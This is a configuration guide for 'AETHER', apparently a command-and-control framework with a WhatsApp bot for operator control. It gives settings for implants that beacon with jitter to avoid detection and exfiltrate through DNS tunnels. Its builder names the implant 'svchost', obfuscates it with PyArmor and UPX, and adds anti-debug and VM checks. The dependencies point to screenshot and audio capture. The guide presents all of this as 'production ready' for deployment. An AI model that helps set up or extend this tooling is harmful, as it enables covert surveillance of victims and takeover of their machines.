# AETHER C2 Complete Configuration Guide

## Overview

This guide covers all configuration files and settings needed to run the complete AETHER C2 framework including the WhatsApp bot integration.

## Project Structure with Configuration Files

```
AETHER/
├── MASTER_SETUP.py              ← START HERE: Interactive setup wizard
├── COMPLETE_SETUP_GUIDE.md      ← Full installation steps
├── config.json                   ← Main configuration file (MUST EDIT)
├── requirements.txt              ← Python dependencies
│
├── server/
│   ├── aether_server.py          ← C2 server (requires config.json)
│   ├── crypto.py                 ← Encryption handler
│   ├── sessions.py               ← Session management
│   ├── comms/
│   │   ├── __init__.py
│   │   ├── whatsapp_config.py    ← WhatsApp settings (AUTO-GENERATED)
│   │   ├── whatsapp_bridge.py    ← Bridge to bot
│   │   └── WHATSAPP_GUIDE.py     ← WhatsApp API docs
│   └── commands/
│       ├── command_suite.py
│       ├── file_commands.py
│       └── __init__.py
│
├── agent/
│   ├── aether_agent.py           ← Agent implant (uses config.json)
│   ├── core/
│   │   ├── communicator.py       ← C2 communication
│   │   ├── evasion.py            ← Evasion techniques
│   │   └── persistence.py        ← Persistence mechanisms
│   ├── modules/
│   │   ├── intelligence/         ← Data gathering
│   │   ├── system/               ← System operations
│   │   ├── network/              ← Network operations
│   │   └── advanced/             ← Advanced capabilities
│   └── utils/
│       └── __init__.py
│
├── builder/
│   ├── compile.py                ← Agent compiler (uses config.json)
│   ├── config_generator.py
│   └── icon_forger.py
│
├── stager/
│   └── stager.py                 ← First-stage loader
│
└── WA-BOT-Base/                  ← WhatsApp Bot
    ├── package.json              ← Node.js dependencies
    ├── main.js                   ← Bot entry point
    ├── handler.js                ← Command handler
    ├── aether-bridge.js          ← Bridge to server (uses whatsapp_config.py)
    ├── aether-handler.js         ← Message handler
    ├── aether-integration.js     ← Integration helpers
    └── AETHER_README.md
```

## Critical Configuration Files

### 1. `config.json` - Main Server Configuration

**Location**: `/workspaces/test/config.json`

**Purpose**: Central configuration used by server, agent, and builder

**Key Sections**:

#### Server Section
```json
{
  "c2_host": "0.0.0.0",           // Listen address
  "c2_port": 443,                 // Listen port
  "c2_protocol": "https",         // https or http
  "encryption_key": "RANDOM_64_CHAR_STRING",  // MUST CHANGE
}
```

**Configuration Steps**:
1. Generate secure key: `python3 -c "import secrets; print(secrets.token_hex(32))"`
2. Replace `CHANGE_THIS_TO_RANDOM_64_CHAR_STRING_IN_PRODUCTION`
3. Update `c2_host` if using specific IP (e.g., 192.168.1.100)
4. Update `c2_port` if not using 443

#### Agent Communication Section
```json
{
  "agent": {
    "c2_host": "garden-helper.fi",    // Target sees this
    "c2_port": 443,
    "beacon_interval": 30,             // Seconds between beacons
    "jitter_percent": 20,              // Random variation %
    "sleep_time": 5
  }
}
```

**Critical Notes**:
- `c2_host` should be domain/IP agents connect to (can be different from server listen address)
- `beacon_interval` = seconds between check-ins (lower = more traffic but faster response)
- `jitter_percent` = randomness to avoid pattern detection

#### Universal C2 Channels Section
```json
{
  "universal_c2": {
    "enabled": true,
    "channels": [
      {
        "type": "https_direct",
        "host": "garden-helper.fi",
        "port": 443,
        "path": "/api/v1/beacon",
        "priority": 1
      },
      {
        "type": "dns_tunnel",
        "domain": "DGA_GENERATED",
        "nameserver": "8.8.8.8",
        "priority": 2
      }
    ]
  }
}
```

**Options**:
- Type `https_direct`: Direct HTTPS connection
- Type `https_fronting`: Domain fronting (e.g., through CDN)
- Type `dns_tunnel`: DNS exfiltration
- Priority: Lower = tried first

#### Builder Section
```json
{
  "builder": {
    "output_name": "svchost",       // Executable name
    "icon_path": "builder/default.ico",
    "use_pyarmor": true,            // Code obfuscation
    "use_upx": true,                // Binary compression
    "obfuscation_level": "high"     // low, medium, high
  }
}
```

### 2. `server/comms/whatsapp_config.py` - WhatsApp Integration

**Location**: `/workspaces/test/server/comms/whatsapp_config.py`

**Purpose**: WhatsApp bot connection and user management

**Auto-Generated By**: MASTER_SETUP.py

**Manual Configuration**:

```python
WHATSAPP_CONFIG = {
    'bot_url': 'http://localhost:3000',      # Bot server address
    'bot_api_key': 'your-api-key-here',      # Optional API key
    'auth_password': 'aether2025',           # CHANGE THIS!
    'authorized_users': [                     # Whitelist
        '+1234567890',
        '+0987654321',
    ],
    'enable_command_history': True,
    'enable_session_linking': True,
    'max_message_length': 4096,
    'command_timeout': 30,
}
```

**Configuration Steps**:
1. Change `auth_password` to something strong
2. Add phone numbers to `authorized_users` (international format: +country code + number)
3. Update `bot_url` if running bot on different host/port
4. Set `bot_api_key` if using authentication

### 3. `WA-BOT-Base/aether-bridge.js` - Bot Bridge Configuration

**Location**: `/workspaces/test/WA-BOT-Base/aether-bridge.js`

**Purpose**: JavaScript configuration for bot-to-server communication

**Configuration Section** (lines ~10-20):
```javascript
const config = {
    aetherHost: 'http://localhost',      // AETHER server host
    aetherPort: 5000,                    // AETHER server port
    apiKey: '',                           // API key if needed
    commandTimeout: 30000,                // Timeout in ms
    maxRetries: 3,                        // Retry attempts
    retryDelay: 1000,                     // Delay between retries ms
};
```

**Configuration Steps**:
1. Update `aetherHost` if server on different machine (e.g., 'http://192.168.1.100')
2. Update `aetherPort` if server on different port (default: 5000)
3. Set `apiKey` if using authentication

### 4. `requirements.txt` - Python Dependencies

**Location**: `/workspaces/test/requirements.txt`

**Purpose**: All Python packages needed

**Installation**:
```bash
pip install -r requirements.txt
```

**Key Dependencies**:
- `cryptography` - Encryption
- `requests` - HTTP client
- `pillow` - Screenshot capture
- `pyaudio` - Audio recording
- `pywin32` - Windows API
- `wmi` - Windows management
- `pyinstaller` - Agent compilation
- `pyarmor` - Code obfuscation

**Adding New Dependencies**:
1. Install: `pip install package_name`
2. Add to requirements.txt: `echo package_name >> requirements.txt`
3. Update hash: `pip freeze | grep package_name >> requirements.txt`

### 5. `WA-BOT-Base/package.json` - Node.js Dependencies

**Location**: `/workspaces/test/WA-BOT-Base/package.json`

**Purpose**: WhatsApp bot dependencies

**Installation**:
```bash
cd WA-BOT-Base
npm install
```

**Key Dependencies**:
- `@whiskeysockets/baileys` - WhatsApp library
- `chalk` - Colored output
- `pino` - Logging

**Updating Baileys**:
```bash
cd WA-BOT-Base
npm update @whiskeysockets/baileys
```

## Configuration Workflows

### Scenario 1: Simple Local Testing

```
config.json:
  c2_host: "0.0.0.0"
  c2_port: 443
  
agent:
  c2_host: "localhost"
  c2_port: 443

WA-BOT-Base/aether-bridge.js:
  aetherHost: 'http://localhost'
  aetherPort: 5000
```

**Start**:
```bash
# Terminal 1
python3 server/aether_server.py

# Terminal 2
cd WA-BOT-Base && npm start

# Terminal 3
# Scan QR code, then
# In AETHER console: whatsapp enable
```

### Scenario 2: Production Deployment

```
config.json:
  c2_host: "192.168.1.100"
  c2_port: 443
  encryption_key: "SECURELY_GENERATED"
  
agent:
  c2_host: "garden-helper.fi"  # Domain registered to server
  c2_port: 443

server/comms/whatsapp_config.py:
  auth_password: "VERY_STRONG_PASSWORD"
  authorized_users: ["+1234567890"]  # Only your number

WA-BOT-Base/aether-bridge.js:
  aetherHost: 'http://192.168.1.100'
  aetherPort: 5000
```

### Scenario 3: Multi-Team Setup

```
config.json:
  # Single server listening on all interfaces
  c2_host: "0.0.0.0"
  c2_port: 443

agent:
  c2_host: "shared-c2.company.com"  # Public domain
  c2_port: 443

server/comms/whatsapp_config.py:
  authorized_users: [
    "+1111111111",  # Team lead
    "+2222222222",  # Operator 1
    "+3333333333",  # Operator 2
  ]
```

## Security Checklist

### Before Production Deployment

- [ ] Changed encryption_key in config.json
- [ ] Changed auth_password in whatsapp_config.py
- [ ] Updated agent c2_host to actual domain/IP
- [ ] Set WhatsApp authorized_users whitelist
- [ ] Generated new encryption keys for builder
- [ ] Firewall configured to allow only known IPs
- [ ] HTTPS certificates valid (if using https)
- [ ] Logs not storing sensitive data
- [ ] Database encrypted if using persistence
- [ ] Agent timeout set reasonably
- [ ] Anti-debug/VM checks enabled in builder
- [ ] Tested in isolated environment first

### Per-Agent Configuration

```python
# In agent/aether_agent.py __init__:

config = {
    'c2_host': 'garden-helper.fi',
    'c2_port': 443,
    'c2_protocol': 'https',
    'encryption_key': config_from_file,  # From config.json
    'beacon_interval': 30 + random(0, 20),  # Randomized
    'jitter': 0.2,  # 20% variance
    'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    'proxy': None,  # Set if needed
}
```

## Troubleshooting Configuration Issues

### "Connection refused" when starting agent

**Problem**: Agent can't connect to C2

**Solution**:
1. Check `config.json` agent.c2_host is correct
2. Verify server is running: `netstat -an | grep 443`
3. Check firewall allows port 443
4. Try localhost first: `c2_host: "localhost"`

### "Unauthorized" in WhatsApp

**Problem**: WhatsApp bot rejects commands

**Solution**:
1. Check password: `whatsapp_config.py` auth_password
2. Verify number is in authorized_users
3. Check message format: `auth <password>`
4. Review logs for error messages

### "Module not found" errors

**Problem**: Missing Python dependencies

**Solution**:
```bash
pip install -r requirements.txt
# Or specific package:
pip install cryptography pyaudio
```

### WhatsApp bot doesn't scan QR code

**Problem**: Baileys not generating QR

**Solution**:
1. Delete `WA-BOT-Base/auth_info_baileys/` folder
2. Restart bot: `npm start`
3. Check Node.js version: `node --version` (need 16+)
4. Try different terminal

## Configuration File Examples

### Minimal Setup (Testing)

```json
{
  "c2_host": "localhost",
  "c2_port": 443,
  "c2_protocol": "http",
  "encryption_key": "test_key_32_chars_min_required",
  "agent": {
    "c2_host": "localhost",
    "c2_port": 443,
    "beacon_interval": 30,
    "jitter_percent": 20
  },
  "builder": {
    "output_name": "agent",
    "use_pyarmor": false,
    "obfuscation_level": "low"
  }
}
```

### Full Production Setup

```json
{
  "c2_host": "192.168.1.100",
  "c2_port": 443,
  "c2_protocol": "https",
  "encryption_key": "LONG_RANDOM_STRING_AT_LEAST_32_CHARS_MINIMUM",
  "universal_c2": {
    "enabled": true,
    "channels": [
      {
        "type": "https_direct",
        "host": "target-domain.com",
        "port": 443,
        "path": "/api/v1/beacon",
        "priority": 1
      },
      {
        "type": "dns_tunnel",
        "domain": "generated.domain.com",
        "nameserver": "8.8.8.8",
        "priority": 2
      }
    ]
  },
  "agent": {
    "c2_host": "target-domain.com",
    "c2_port": 443,
    "c2_protocol": "https",
    "beacon_interval": 45,
    "jitter_percent": 30,
    "sleep_time": 5,
    "enable_evasion": true,
    "enable_persistence": true
  },
  "builder": {
    "output_name": "svchost",
    "icon_path": "builder/svchost.ico",
    "use_pyarmor": true,
    "use_upx": true,
    "obfuscation_level": "high"
  },
  "whatsapp": {
    "bot_url": "http://192.168.1.100:3000",
    "bot_api_key": "SECURE_API_KEY",
    "auth_password": "STRONG_PASSWORD_HERE",
    "authorized_users": ["+1234567890"]
  }
}
```

## Environment Variables

You can also configure using environment variables (overrides config.json):

```bash
export AETHER_C2_HOST=192.168.1.100
export AETHER_C2_PORT=443
export AETHER_C2_PROTOCOL=https
export AETHER_ENCRYPTION_KEY=your_key_here
export WHATSAPP_BOT_URL=http://localhost:3000
export WHATSAPP_AUTH_PASSWORD=secure_password
```

**In Python code**:
```python
import os

encryption_key = os.getenv('AETHER_ENCRYPTION_KEY', config.get('encryption_key'))
bot_url = os.getenv('WHATSAPP_BOT_URL', 'http://localhost:3000')
```

## Next Steps

1. **Run MASTER_SETUP.py**: Interactive configuration
   ```bash
   python3 MASTER_SETUP.py
   ```

2. **Verify Config**: Check generated files
   ```bash
   cat config.json
   cat server/comms/whatsapp_config.py
   ```

3. **Start Services**: In separate terminals
   ```bash
   # Terminal 1: Server
   python3 server/aether_server.py
   
   # Terminal 2: Bot
   cd WA-BOT-Base && npm start
   
   # Terminal 3: Agent (after building)
   python3 builder/compile.py
   ```

4. **Verify Operation**: Check connection
   ```
   AETHER> sessions
   AETHER> whatsapp status
   ```

See `COMPLETE_SETUP_GUIDE.md` for detailed installation steps.

---

**Last Updated**: December 2025
**Status**: Production Ready
